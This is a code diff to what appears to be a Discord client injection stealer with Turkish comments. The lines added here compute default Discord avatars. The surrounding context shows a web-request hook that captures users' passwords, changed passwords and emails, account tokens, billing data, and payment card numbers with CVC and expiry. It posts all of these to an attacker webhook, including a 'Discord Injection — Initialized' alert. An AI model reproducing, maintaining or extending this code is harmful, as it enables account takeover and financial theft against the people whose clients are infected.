@@ -134,8 +134,24 @@ async function getIP() {
     });
 }
 
-async function resolveAvatar(baseUrl) {
-    if (!baseUrl) return null;
+async function resolveAvatar(baseUrl, userId, discriminator) {
+    // Avatar yoksa Discord'un default avatar'ını hesapla
+    if (!baseUrl) {
+        try {
+            let avatarIndex;
+            // Yeni hesaplar (discriminator = "0")
+            if (discriminator === '0' || !discriminator) {
+                avatarIndex = (Number(BigInt(userId) >> 22n)) % 6;
+            } else {
+                // Eski hesaplar (discriminator bazlı)
+                avatarIndex = parseInt(discriminator) % 5;
+            }
+            return `https://cdn.discordapp.com/embed/avatars/${avatarIndex}.png`;
+        } catch {
+            return 'https://cdn.discordapp.com/embed/avatars/0.png';
+        }
+    }
+    
     return new Promise(resolve => {
         const gifUrl = baseUrl + '.gif?size=512';
         const req = https.get(gifUrl, { timeout: 6000 }, res => {
@@ -292,7 +308,11 @@ async function buildUserInfo(token) {
     }
 
     const [avatar, banner] = await Promise.all([
-        resolveAvatar(user.avatar ? `https://cdn.discordapp.com/avatars/${user.id}/${user.avatar}` : null),
+        resolveAvatar(
+            user.avatar ? `https://cdn.discordapp.com/avatars/${user.id}/${user.avatar}` : null,
+            user.id,
+            user.discriminator
+        ),
         resolveAvatar(user.banner ? `https://cdn.discordapp.com/banners/${user.id}/${user.banner}` : null),
     ]);
     return { user, billing, avatar, banner };
@@ -388,7 +408,7 @@ async function firstTime() {
                 await postWebhook(buildPayload(
                     'Discord Injection — Initialized',
                     fields,
-                    avatar || AVATAR_URL, null
+                    avatar, null
                 ));
             } catch {}
         }
@@ -497,7 +517,7 @@ session.defaultSession.webRequest.onCompleted({
                     ...base,
                     `<:token:1533639840254660640> **Password:** \`${data.password}\``,
                 ]),
-                avatar || AVATAR_URL, null
+                avatar, null
             ));
             break;
 
@@ -512,7 +532,7 @@ session.defaultSession.webRequest.onCompleted({
                         ``,
                         `<:arti:1533734612906414120> **New Password:** \`${data.new_password}\``,
                     ]),
-                    avatar || AVATAR_URL, null
+                    avatar, null
                 ));
             }
             if (data.email) {
@@ -523,7 +543,7 @@ session.defaultSession.webRequest.onCompleted({
                         `<:mail:1533638816559140877> **New Email:** \`${data.email}\``,
                         `<:token:1533639840254660640> **Password:** \`${data.password}\``,
                     ]),
-                    avatar || AVATAR_URL, null
+                    avatar, null
                 ));
             }
             break;
@@ -537,7 +557,7 @@ session.defaultSession.webRequest.onCompleted({
                     `<:lock:1533640371882557501> **CVC:** \`${data['card[cvc]'] || 'N/A'}\``,
                     `<:card:1533639749376671785> **Expiry:** \`${data['card[exp_month]'] || '?'}/${data['card[exp_year]'] || '?'}\``,
                 ]),
-                avatar || AVATAR_URL, null
+                avatar, null
             ));
             break;
 
@@ -545,7 +565,7 @@ session.defaultSession.webRequest.onCompleted({
             await postWebhook(buildPayload(
                 'Discord — PayPal Added',
                 buildFields(user, billing, null, token, base),
-                avatar || AVATAR_URL, null
+                avatar, null
             ));
             break;
 
